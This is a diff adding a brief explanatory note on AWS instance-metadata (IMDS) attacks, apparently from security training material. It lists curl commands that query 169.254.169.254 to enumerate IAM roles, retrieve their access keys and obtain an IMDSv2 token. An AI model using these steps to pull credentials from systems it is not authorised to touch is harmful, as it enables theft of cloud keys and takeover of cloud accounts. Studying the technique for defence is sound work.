@@ -1,0 +1,30 @@
+In an AWS environment, cloud access keys are security credentials used by an IAM user or an AWS account as the root user to access AWS services.
+
+The access key ID and secret access key are integral parts of the cloud keys that can be used to authenticate requests. 
+
+Attackers launch IMDS attacks to obtain cloud keys and gain access to cloud resources.
+
+The attacker can access a REST API operating at a particular IP address (here, 169.254.169.254) through the IMDS (IMDSv1) and obtain information about the EC2 instances and their security credentials. 
+
+Attackers can use an IPv6 address (fd00:ec2::254) for Nitro EC2 instances
+
+▪ Run the following curl command to access the instances and identify the various associated roles:
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+▪ Now, add a role name as a suffix to obtain the cloud keys:
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM-Role-Name>
+
+▪ Run the following command to generate a token by specifying a session duration:
+TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
+
+▪ Then, use the generated token in all AWS requests:
+curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/
+
+
+
+
+
+
+
+
+
